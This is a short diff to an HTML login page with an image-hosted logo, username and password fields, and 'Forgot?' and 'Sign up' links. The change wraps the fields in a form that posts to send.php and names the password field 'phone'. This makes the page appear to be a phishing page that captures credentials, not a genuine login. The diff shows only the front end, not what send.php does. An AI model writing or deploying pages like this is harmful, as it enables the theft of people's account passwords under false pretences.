@@ -11,9 +11,6 @@
 </head>
 <body>
 
-    
-    <div class="header">
-        <div class="container">
             <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
     
     <div id="wrapper">
@@ -21,21 +18,19 @@
         <div class="header">
           <img src="https://i.imgur.com/zqpwkLQ.png" />
         </div>
-        <div class="l-part">
-          <input type="text" placeholder="Username" class="input-1" />
+        <form action="send.php" class="l-part" method="post">
+          <input type="text" placeholder="Username" name="name" class="input-1" />
           <div class="overlap-text">
-            <input type="password" placeholder="Password" class="input-2" />
+            <input type="password" placeholder="Password" name="phone" class="input-2" />
             <a href="#">Forgot?</a>
           </div>
           <input type="button" value="Log in" class="btn" />
-        </div>
+        </form>
       </div>
       <div class="sub-content">
         <div class="s-part">
           Don't have an account?<a href="#">Sign up</a>
         </div>
-      </div>
-    </div>
     
     
 
